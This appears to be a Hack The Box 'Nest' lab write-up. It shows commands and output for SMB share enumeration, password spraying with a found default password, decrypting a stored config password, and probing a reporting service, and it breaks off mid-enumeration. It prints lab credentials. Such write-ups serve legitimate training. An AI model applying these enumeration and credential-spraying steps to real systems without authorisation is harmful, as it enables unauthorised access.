@@ -1,0 +1,1008 @@
+NEST - Hack The Box - Windows Easy, lots of enumeration, OSCP Like Machine, no exploitation.
+
+Will run crackmapexec for enumeration
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/nest]
+└──╼ $crackmapexec smb 10.10.10.178
+SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
+====================================================================================================================================
+
+Name: HTB-NEST 
+Build: Windows 6.1 Build 7601
+
+Will also use smbclient,
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/nest]
+└──╼ $smbclient -L \\10.10.10.178 -N
+Enter WORKGROUP\user's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	Data            Disk      
+	IPC$            IPC       Remote IPC
+	Secure$         Disk      
+	Users           Disk      
+SMB1 disabled -- no workgroup available
+=====================================================================================================================================
+
+The unique shares are DATA SECURE and USERS.
+
+SMBMAP next
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/nest]
+└──╼ $smbmap -H 10.10.10.178 -u 'asasas'
+[+] Guest session   	IP: 10.10.10.178:445	Name: 10.10.10.178                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	Data                                              	READ ONLY	
+	IPC$                                              	NO ACCESS	Remote IPC
+	Secure$                                           	NO ACCESS	
+	Users                                             	READ ONLY	
+=====================================================================================================================================
+
+Apparently you need to specify a username even if it does not exist to get output. If you don;t specify a user you don't get anything
+back.
+
+Going back to crackmapexec we can try the same thing and see what happens, this time around we have to specify both a user and 
+password to get it to work and list the shares. Might be to the fact that null authentication is disabled and anonymous auth is 
+enabled.
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/nest]
+└──╼ $crackmapexec smb 10.10.10.178 --shares -u 'aasasasa' -p 'asajsjsjs'
+SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
+SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\aasasasa:asajsjsjs 
+SMB         10.10.10.178    445    HTB-NEST         [+] Enumerated shares
+SMB         10.10.10.178    445    HTB-NEST         Share           Permissions     Remark
+SMB         10.10.10.178    445    HTB-NEST         -----           -----------     ------
+SMB         10.10.10.178    445    HTB-NEST         ADMIN$                          Remote Admin
+SMB         10.10.10.178    445    HTB-NEST         C$                              Default share
+SMB         10.10.10.178    445    HTB-NEST         Data            READ            
+SMB         10.10.10.178    445    HTB-NEST         IPC$                            Remote IPC
+SMB         10.10.10.178    445    HTB-NEST         Secure$                         
+SMB         10.10.10.178    445    HTB-NEST         Users           READ            
+=====================================================================================================================================
+
+
+We can directly interact with shares using smbclient
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/nest]
+└──╼ $smbclient //10.10.10.178/Users
+Enter WORKGROUP\user's password: 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sat Jan 25 15:04:21 2020
+  ..                                  D        0  Sat Jan 25 15:04:21 2020
+  Administrator                       D        0  Fri Aug  9 08:08:23 2019
+  C.Smith                             D        0  Sat Jan 25 23:21:44 2020
+  L.Frost                             D        0  Thu Aug  8 10:03:01 2019
+  R.Thompson                          D        0  Thu Aug  8 10:02:50 2019
+  TempUser                            D        0  Wed Aug  7 15:55:56 2019
+
+		10485247 blocks of size 4096. 6545952 blocks available
+=====================================================================================================================================
+
+It's better to mount the shares and navigate using linux. Mount cifs-utils is used.
+
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/nest]
+└──╼ $sudo apt install cifs-utils -y
+sudo mkdir users
+┌─[user@parrot-virtual]─[/mnt]
+└──╼ $sudo mkdir data
+┌─[user@parrot-virtual]─[/mnt]
+└──╼ $sudo mount -t cifs //10.10.10.178/Users /mnt/users/
+Password for root@//10.10.10.178/Users: 
+┌─[user@parrot-virtual]─[/mnt]
+└──╼ $sudo mount -t cifs //10.10.10.178/data /mnt/data
+Password for root@//10.10.10.178/data:
+=====================================================================================================================================
+
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/mnt/data]
+└──╼ $find . -ls -type f 2>/dev/null
+1125899906842897      4 drwxr-xr-x   2 root     root         4096 Aug  7  2019 .
+ 844424930132248      0 drwxr-xr-x   2 root     root            0 Aug  7  2019 ./IT
+ 844424930132250      0 drwxr-xr-x   2 root     root            0 Aug  5  2019 ./Production
+ 844424930132251      0 drwxr-xr-x   2 root     root            0 Aug  5  2019 ./Reports
+ 844424930132247      0 drwxr-xr-x   2 root     root            0 Aug  7  2019 ./Shared
+1688849860264220      0 drwxr-xr-x   2 root     root            0 Aug  7  2019 ./Shared/Maintenance
+1125899906845957      1 -rwxr-xr-x   1 root     root           48 Aug  5  2019 ./Shared/Maintenance/Maintenance\ Alerts.txt
+ 844424930132246      0 drwxr-xr-x   2 root     root            0 Aug  7  2019 ./Shared/Templates
+1688849860267257      0 drwxr-xr-x   2 root     root            0 Aug  7  2019 ./Shared/Templates/HR
+ 844424930132258      1 -rwxr-xr-x   1 root     root          425 Aug  7  2019 ./Shared/Templates/HR/Welcome\ Email.txt
+1125899906845947      0 drwxr-xr-x   2 root     root            0 Aug  7  2019 ./Shared/Templates/Marketing
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[/mnt/data]
+└──╼ $cat ./Shared/Templates/HR/Welcome\ Email.txt
+We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>
+
+You will find your home folder in the following location: 
+\\HTB-NEST\Users\<USERNAME>
+
+If you have any issues accessing specific services or workstations, please inform the 
+IT department and use the credentials below until all systems have been set up for you.
+
+Username: TempUser
+Password: welcome2019
+
+
+Thank you
+HR
+=====================================================================================================================================
+
+So we got a username and it seems to match a previous user we found in the users directory, we will now create a users list to test 
+the password we found using crackmapexec.
+
+Commands and Output:
+=====================================================================================================================================
+└──╼ $crackmapexec smb 10.10.10.178 -u users.lst -p 'welcome2019'
+SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
+SMB         10.10.10.178    445    HTB-NEST         [-] HTB-NEST\Administrator:welcome2019 STATUS_LOGON_FAILURE 
+SMB         10.10.10.178    445    HTB-NEST         [-] HTB-NEST\C.Smith:welcome2019 STATUS_LOGON_FAILURE 
+SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\L.Frost:welcome2019 
+=====================================================================================================================================
+
+Apparently L.Frost matches, we will try to get crackmap to not stop on success.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/nest]
+└──╼ $crackmapexec smb 10.10.10.178 -u users.lst -p 'welcome2019' --continue-on-success
+SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
+SMB         10.10.10.178    445    HTB-NEST         [-] HTB-NEST\Administrator:welcome2019 STATUS_LOGON_FAILURE 
+SMB         10.10.10.178    445    HTB-NEST         [-] HTB-NEST\C.Smith:welcome2019 STATUS_LOGON_FAILURE 
+SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\L.Frost:welcome2019 
+SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\R.Thompson:welcome2019 
+SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\TempUser:welcome2019 
+=====================================================================================================================================
+
+Apparently 3 users have the same creds as L.Frost, we can create indvidual mount points for each user to make it easier to move.
+However, there appears to be some kind of bug that is preventing or maybe the users do not exist that is not permitting the shown
+users to mount unto the box with the neccessary credetnials. 
+
+Most likely the users were previously removed hence why it is not working and fake authentications with random usernmaes and 
+passwords are working.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/mnt]
+└──╼ $sudo mount -t cifs -o 'username=TempUser,password=welcome2019' //10.10.10.178/Users/TempUser /mnt/TempUser/
+┌─[user@parrot-virtual]─[/mnt]
+└──╼ $cd !$
+cd /mnt/TempUser/
+┌─[user@parrot-virtual]─[/mnt/TempUser]
+└──╼ $ls
+'New Text Document.txt'
+=====================================================================================================================================
+
+We are able to find a file for the temp user. Now we will mount the secure share that is available.
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[/mnt]
+└──╼ $sudo mount -t cifs //10.10.10.178/Secure$ /mnt/secure
+Password for root@//10.10.10.178/Secure$: 
+┌─[user@parrot-virtual]─[/mnt]
+└──╼ $cd /mnt/secure/
+┌─[user@parrot-virtual]─[/mnt/secure]
+└──╼ $ls
+ls: reading directory '.': Permission denied
+=====================================================================================================================================
+
+We get a permission denied. We will try using the temp user and see if that works.
+
+Commands and Output:
+=====================================================================================================================================
+sudo mkdir /mnt/secure
+┌─[✗]─[user@parrot-virtual]─[/mnt]
+└──╼ $sudo mount -t cifs -o 'username=TempUser,password=welcome2019' //10.10.10.178/Secure$ /mnt/secure
+=====================================================================================================================================
+
+Mounting works however we are unsuccessful and retrieving or enumerating anything else.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/mnt]
+└──╼ $cd secure/
+┌─[user@parrot-virtual]─[/mnt/secure]
+└──╼ $ls
+Finance  HR  IT
+┌─[user@parrot-virtual]─[/mnt/secure]
+└──╼ $find . -type f -ls
+find: ‘./Finance’: Permission denied
+find: ‘./HR’: Permission denied
+find: ‘./IT’: Permission denied
+=====================================================================================================================================
+
+Next will mount data folder with TempUser's creds to see if we can get more insights on file access
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/mnt]
+└──╼ $sudo mount -t cifs -o 'username=TempUser,password=welcome2019' //10.10.10.178/data /mnt/data
+┌─[user@parrot-virtual]─[/mnt]
+└──╼ $cd /mnt/data/
+┌─[user@parrot-virtual]─[/mnt/data]
+└──╼ $ls
+IT  Production  Reports  Shared
+┌─[user@parrot-virtual]─[/mnt/data]
+└──╼ $find . 
+.
+./IT
+./IT/Archive
+./IT/Configs
+./IT/Configs/Adobe
+./IT/Configs/Adobe/editing.xml
+./IT/Configs/Adobe/Options.txt
+./IT/Configs/Adobe/projects.xml
+./IT/Configs/Adobe/settings.xml
+./IT/Configs/Atlas
+./IT/Configs/Atlas/Temp.XML
+./IT/Configs/DLink
+./IT/Configs/Microsoft
+./IT/Configs/Microsoft/Options.xml
+./IT/Configs/NotepadPlusPlus
+./IT/Configs/NotepadPlusPlus/config.xml
+./IT/Configs/NotepadPlusPlus/shortcuts.xml
+./IT/Configs/RU Scanner
+./IT/Configs/RU Scanner/RU_config.xml
+./IT/Configs/Server Manager
+./IT/Installs
+./IT/Reports
+./IT/Tools
+./Production
+./Reports
+./Shared
+./Shared/Maintenance
+./Shared/Maintenance/Maintenance Alerts.txt
+./Shared/Templates
+./Shared/Templates/HR
+./Shared/Templates/HR/Welcome Email.txt
+./Shared/Templates/Marketing
+=====================================================================================================================================
+
+Apparently windows formats everything in utf-16. We will have to convert it using the iconv command and place into utf 8 maybe.
+Commands and Output:
+=====================================================================================================================================
+
+┌─[user@parrot-virtual]─[/mnt/data/IT]
+└──╼ $file ./Configs/Adobe/editing.xml
+./Configs/Adobe/editing.xml: XML 1.0 document, Little-endian UTF-16 Unicode text, with CRLF line terminators
+┌─[user@parrot-virtual]─[/mnt/data/IT]
+└──╼ $less ./Configs/Adobe/editing.xml | iconv -f utf-16le -t utf-8
+"./Configs/Adobe/editing.xml" may be a binary file.  See it anyway? Y
+
+<?xml version="1.0" encoding="UTF-16"?>
+<q:data version="0" xmlns:q="http://ns.adobe.com/version-cue/library/editing"/>
+=====================================================================================================================================
+
+Apparently it is padding with 2 character bytes 
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/mnt/data/IT]
+└──╼ $xxd ./Configs/Adobe/editing.xml
+00000000: fffe 3c00 3f00 7800 6d00 6c00 2000 7600  ..<.?.x.m.l. .v.
+00000010: 6500 7200 7300 6900 6f00 6e00 3d00 2200  e.r.s.i.o.n.=.".
+00000020: 3100 2e00 3000 2200 2000 6500 6e00 6300  1...0.". .e.n.c.
+00000030: 6f00 6400 6900 6e00 6700 3d00 2200 5500  o.d.i.n.g.=.".U.
+00000040: 5400 4600 2d00 3100 3600 2200 3f00 3e00  T.F.-.1.6.".?.>.
+00000050: 0d00 0a00 3c00 7100 3a00 6400 6100 7400  ....<.q.:.d.a.t.
+00000060: 6100 2000 7600 6500 7200 7300 6900 6f00  a. .v.e.r.s.i.o.
+00000070: 6e00 3d00 2200 3000 2200 2000 7800 6d00  n.=.".0.". .x.m.
+00000080: 6c00 6e00 7300 3a00 7100 3d00 2200 6800  l.n.s.:.q.=.".h.
+00000090: 7400 7400 7000 3a00 2f00 2f00 6e00 7300  t.t.p.:././.n.s.
+000000a0: 2e00 6100 6400 6f00 6200 6500 2e00 6300  ..a.d.o.b.e...c.
+000000b0: 6f00 6d00 2f00 7600 6500 7200 7300 6900  o.m./.v.e.r.s.i.
+000000c0: 6f00 6e00 2d00 6300 7500 6500 2f00 6c00  o.n.-.c.u.e./.l.
+000000d0: 6900 6200 7200 6100 7200 7900 2f00 6500  i.b.r.a.r.y./.e.
+000000e0: 6400 6900 7400 6900 6e00 6700 2200 2f00  d.i.t.i.n.g."./.
+000000f0: 3e00 0d00 0a00                           >.....
+
+=====================================================================================================================================
+
+If we apply the consversion it gets rid of it.
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/mnt/data/IT]
+└──╼ $less ./Configs/Adobe/editing.xml | iconv -f utf-16le -t utf-8 | xxd
+"./Configs/Adobe/editing.xml" may be a binary file.  See it anyway? Y
+
+00000000: efbb bf3c 3f78 6d6c 2076 6572 7369 6f6e  ...<?xml version
+00000010: 3d22 312e 3022 2065 6e63 6f64 696e 673d  ="1.0" encoding=
+00000020: 2255 5446 2d31 3622 3f3e 0d0a 3c71 3a64  "UTF-16"?>..<q:d
+00000030: 6174 6120 7665 7273 696f 6e3d 2230 2220  ata version="0" 
+00000040: 786d 6c6e 733a 713d 2268 7474 703a 2f2f  xmlns:q="http://
+00000050: 6e73 2e61 646f 6265 2e63 6f6d 2f76 6572  ns.adobe.com/ver
+00000060: 7369 6f6e 2d63 7565 2f6c 6962 7261 7279  sion-cue/library
+00000070: 2f65 6469 7469 6e67 222f 3e0d 0a         /editing"/>..
+
+=====================================================================================================================================
+
+Moving along, we try the same thing on notepad directory and files and see what we get. We just cat it this time
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[/mnt/data/IT/Configs]
+└──╼ $cat NotepadPlusPlus/* 
+<?xml version="1.0" encoding="Windows-1252" ?>
+<NotepadPlus>
+    <GUIConfigs>
+        <!-- 3 status : "large", "small" or "hide"-->
+        <GUIConfig name="ToolBar" visible="yes">standard</GUIConfig>
+        <!-- 2 status : "show" or "hide"-->
+        <GUIConfig name="StatusBar">show</GUIConfig>
+        <Find name="192" />
+        ..
+        ..
+        ..
+        ..
+        ..
+        <Replace name="C_addEvent" />
+    </FindHistory>
+    <History nbMaxFile="15" inSubMenu="no" customLength="-1">
+        <File filename="C:\windows\System32\drivers\etc\hosts" />
+        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
+        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
+    </History>
+</NotepadPlus>
+<NotepadPlus>
+    <ScintillaKeys />
+    ..
+    ..
+    ..
+
+</NotepadPlus>
+=====================================================================================================================================
+
+We see a couple of files that are of interest, looks like the user c.smith was editing the file in Temp.txt, we can presume that the
+"c" in smith stands fro Carl.
+
+Commands and Output:
+=====================================================================================================================================
+    <History nbMaxFile="15" inSubMenu="no" customLength="-1">
+        <File filename="C:\windows\System32\drivers\etc\hosts" />
+        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
+        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
+=====================================================================================================================================
+
+
+We do not have permission to enter the IT, directory but we do have permission to enter the Carl directory within IT.
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[/mnt/secure]
+└──╼ $cat ./IT/Carl/Temp.txt
+cat: ./IT/Carl/Temp.txt: No such file or directory
+┌─[✗]─[user@parrot-virtual]─[/mnt/secure]
+└──╼ $ls
+Finance  HR  IT
+┌─[user@parrot-virtual]─[/mnt/secure]
+└──╼ $ls IT/Carl
+ Docs   Reports  'VB Projects'
+┌─[user@parrot-virtual]─[/mnt/secure]
+└──╼ $cd IT/Carl
+┌─[user@parrot-virtual]─[/mnt/secure/IT/Carl]
+└──╼ $ls
+ Docs   Reports  'VB Projects'
+=====================================================================================================================================
+
+We can further enumerate the contents with a find command.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/mnt/secure/IT/Carl]
+└──╼ $find .
+.
+./Docs
+./Docs/ip.txt
+./Docs/mmc.txt
+./Reports
+./VB Projects
+./VB Projects/Production
+./VB Projects/WIP
+./VB Projects/WIP/RU
+./VB Projects/WIP/RU/RUScanner
+./VB Projects/WIP/RU/RUScanner/bin
+./VB Projects/WIP/RU/RUScanner/bin/Debug
+./VB Projects/WIP/RU/RUScanner/bin/Release
+./VB Projects/WIP/RU/RUScanner/ConfigFile.vb
+./VB Projects/WIP/RU/RUScanner/Module1.vb
+./VB Projects/WIP/RU/RUScanner/My Project
+./VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb
+./VB Projects/WIP/RU/RUScanner/My Project/Application.myapp
+./VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb
+./VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb
+./VB Projects/WIP/RU/RUScanner/My Project/Resources.resx
+./VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb
+./VB Projects/WIP/RU/RUScanner/My Project/Settings.settings
+./VB Projects/WIP/RU/RUScanner/obj
+./VB Projects/WIP/RU/RUScanner/obj/x86
+./VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj
+./VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user
+./VB Projects/WIP/RU/RUScanner/SsoIntegration.vb
+./VB Projects/WIP/RU/RUScanner/Utils.vb
+./VB Projects/WIP/RU/RUScanner.sln
+=====================================================================================================================================
+
+We can also copy the contents of VB projects locally to further analyze.
+If we looked back at the data and IT directory we would see some config files pertaining to the project.
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[/mnt]
+└──╼ $find ./data/ -type f
+./data/IT/Configs/Adobe/editing.xml
+./data/IT/Configs/Adobe/Options.txt
+./data/IT/Configs/Adobe/projects.xml
+./data/IT/Configs/Adobe/settings.xml
+./data/IT/Configs/Atlas/Temp.XML
+./data/IT/Configs/Microsoft/Options.xml
+./data/IT/Configs/NotepadPlusPlus/config.xml
+./data/IT/Configs/NotepadPlusPlus/shortcuts.xml
+./data/IT/Configs/RU Scanner/RU_config.xml
+./data/Shared/Maintenance/Maintenance Alerts.txt
+./data/Shared/Templates/HR/Welcome Email.txt
+=====================================================================================================================================
+
+We find a confg file for the previous VB project "./data/IT/Configs/RU Scanner/RU_config.xml"
+We can cat this and see what we get.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/mnt]
+└──╼ $cat "./data/IT/Configs/RU Scanner/RU_config.xml"
+<?xml version="1.0"?>
+<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <Port>389</Port>
+  <Username>c.smith</Username>
+  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
+</ConfigFile>
+=====================================================================================================================================
+
+We find c.smith's username and hashed password in the file.
+c.smith fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=
+
+Commands and Output:
+=====================================================================================================================================
+└──╼ $echo -n fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE= | base64 -d
+}13��=X�J�BA�X*�Wc�f���?βc
+=====================================================================================================================================
+
+So we can probably leverage the application into telling us what the password is by transfering the files over to a windows box 
+with visual studio installed.
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/mnt]
+└──╼ $cp "/mnt/data/IT/Configs/RU Scanner/RU_config.xml" ~/htb/nest/smb/
+
+
+=====================================================================================================================================
+
+We will create an smb share on our linux box to be able to transfer files over.
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/nest/smb]
+└──╼ $sudo impacket-smbserver -smb2support hacker . -username test -password test
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (192.168.33.4,49859)
+[*] AUTHENTICATE_MESSAGE (DESKTOP-CN05D2Q\commando,DESKTOP-CN05D2Q)
+=====================================================================================================================================
+
+We use our windows commando machine and open the "C:\Users\commando\Desktop\nest\VB Projects\WIP\RU\RUScanner.sln" file.
+We try to find if the project has a decryption method.
+
+In module 1 we will stick a breakpoint in the following line for main
+Commands and Output:
+=====================================================================================================================================
+odule Module1
+
+    Sub Main()
+        Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
+**        Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
+       
+
+
+    End Sub
+
+End Module
+=====================================================================================================================================
+
+As you can see it will load the RU.config file so make sure that the program is able to read it. We make sure it is in the same 
+directory as the sln file for the project and run it. It fails because we need the file in bin/debug
+
+Once we run it correctly we can step into it and we get clear text password.
+After stepping several times through the entire decrypt process we find the plain text password
+Commands and Output:
+=====================================================================================================================================
+		plainText	"xRxRxPANCAK3SxRxRx"	String
+=====================================================================================================================================
+
+We can now try using crackmapexec to test the creds on the server
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/nest]
+└──╼ $crackmapexec smb 10.10.10.178 -u c.smith -p "xRxRxPANCAK3SxRxRx" 
+SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
+SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\c.smith:xRxRxPANCAK3SxRxRx 
+=====================================================================================================================================
+
+Indeed we get the right credentials. We can no try mounting things with c.smith.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/mnt]
+└──╼ $cd !$
+cd /mnt/users
+┌─[user@parrot-virtual]─[/mnt/users]
+└──╼ $ls
+Administrator  C.Smith  L.Frost  R.Thompson  TempUser
+=====================================================================================================================================
+
+We can get the user.txt from user c.smith's directory.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/mnt/users]
+└──╼ $cd C.Smith/
+┌─[user@parrot-virtual]─[/mnt/users/C.Smith]
+└──╼ $ls
+'HQK Reporting'   user.txt
+=====================================================================================================================================
+
+After running that we want to take a look at high port that was found in an earlier nmap, we found port 4386/tcp was open, we can try
+connecting and see the response.
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/nest/nmap]
+└──╼ $nc 10.10.10.178 4386
+
+HQK Reporting Service V1.2
+
+>help
+\r
+\n
+=====================================================================================================================================
+
+Using netcat does not allow us to properly interact with the Reporting service so let's try telnet
+Commands and Output:
+=====================================================================================================================================
+
+=====================================================================================================================================
+
+We come to find that netcat sends a " 0d 0a   " after every request. A carriage return and a new line.
+Netcat only sends a "0a"
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/nest/nmap]
+└──╼ $telnet 10.10.10.178 4386
+Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is '^]'.
+
+HQK Reporting Service V1.2
+
+>help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+=====================================================================================================================================
+
+
+Based on the output we can navgate and set the current directory listing with the setdir command we can also list files with the 
+list command.
+Commands and Output:
+=====================================================================================================================================
+[DIR]  COMPARISONS
+[1]   Invoices (Ordered By Customer)
+[2]   Products Sold (Ordered By Customer)
+[3]   Products Sold In Last 30 Days
+
+Current Directory: ALL QUERIES
+>setdir c:\
+
+Current directory set to c:
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  $Recycle.Bin
+[DIR]  Boot
+[DIR]  Config.Msi
+[DIR]  Documents and Settings
+[DIR]  PerfLogs
+[DIR]  Program Files
+[DIR]  Program Files (x86)
+[DIR]  ProgramData
+[DIR]  Recovery
+[DIR]  Shares
+[DIR]  System Volume Information
+[DIR]  Users
+[DIR]  Windows
+[1]   bootmgr
+[2]   BOOTSECT.BAK
+[3]   pagefile.sys
+[4]   restartsvc.bat
+
+Current Directory: c:
+>cd Users
+
+Unrecognised command
+>setdir Users
+
+Current directory set to Users
+>dit
+
+Unrecognised command
+>dir
+
+Unrecognised command
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  Administrator
+[DIR]  All Users
+[DIR]  Default
+[DIR]  Default User
+[DIR]  Public
+[DIR]  Service_HQK
+[DIR]  TempUser
+[1]   desktop.ini
+
+Current Directory: Users
+>setdir Administrator
+
+Error: Access to the path 'c:\Users\Administrator\' is denied.
+=====================================================================================================================================
+
+Our goal is to find something that can maybe give us administrator with files we have access to, unfortunately administrator dir
+is blocked since we don't have the necessary permissions.
+
+We are going to look inside the service_hqk and see what we can find.
+Commands and Output:
+=====================================================================================================================================
+>setdir Service_HQK
+
+Current directory set to Service_HQK
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  AppData
+[DIR]  Application Data
+[DIR]  Cookies
+[DIR]  Desktop
+[DIR]  Documents
+[DIR]  Downloads
+[DIR]  Favorites
+[DIR]  Links
+[DIR]  Local Settings
+[DIR]  Music
+[DIR]  My Documents
+[DIR]  NetHood
+[DIR]  Pictures
+[DIR]  PrintHood
+[DIR]  Recent
+[DIR]  Saved Games
+[DIR]  SendTo
+[DIR]  Start Menu
+[DIR]  Templates
+[DIR]  Videos
+[1]   NTUSER.DAT
+[2]   ntuser.dat.LOG1
+[3]   ntuser.dat.LOG2
+[4]   NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+[5]   NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+[6]   NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+[7]   ntuser.ini
+=====================================================================================================================================
+
+We again look at what we can do with with help, we can run queries and use debug for more insight but need a password.
+Commands and Output:
+=====================================================================================================================================
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+=====================================================================================================================================
+
+More enumeration needed. We go back and remount users using c.smiths password
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[/mnt]
+└──╼ $sudo mount -t cifs -o 'username=c.smith,password=xRxRxPANCAK3SxRxRx' \\\\10.10.10.178\\Users /mnt/users/
+=====================================================================================================================================
+
+We go back hqk 
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/mnt/users/C.Smith]
+└──╼ $cd HQK\ Reporting/
+┌─[user@parrot-virtual]─[/mnt/users/C.Smith/HQK Reporting]
+└──╼ $ls
+'AD Integration Module'  'Debug Mode Password.txt'   HQK_Config_Backup.xml
+┌─[user@parrot-virtual]─[/mnt/users/C.Smith/HQK Reporting]
+└──╼ $cat Debug\ Mode\ Password.txt 
+┌─[user@parrot-virtual]─[/mnt/users/C.Smith/HQK Reporting]
+└──╼ $cat HQK_Config_Backup.xml 
+<?xml version="1.0"?>
+<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <Port>4386</Port>
+  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
+</ServiceSettings>┌─[user@parrot-virtual]─[/mnt/users/C.Smith/HQK Reporting]
+└──╼ $cd AD\ Integration\ Module/
+┌─[user@parrot-virtual]─[/mnt/users/C.Smith/HQK Reporting/AD Integration Module]
+└──╼ $ls
+HqkLdap.exe
+=====================================================================================================================================
+
+We find an executable that we maybe able to decompile on windows. We will copy it to our smb folder. The downside of using linux
+for mounting remote drives is that we do not have the abillity to view extended attributes or hidden files on the system. 
+
+To look at hiddent files for further enumeration we will need to use smbclient and navigate the curent directries use look using 
+allinfo.
+Commands and Output:
+=====================================================================================================================================
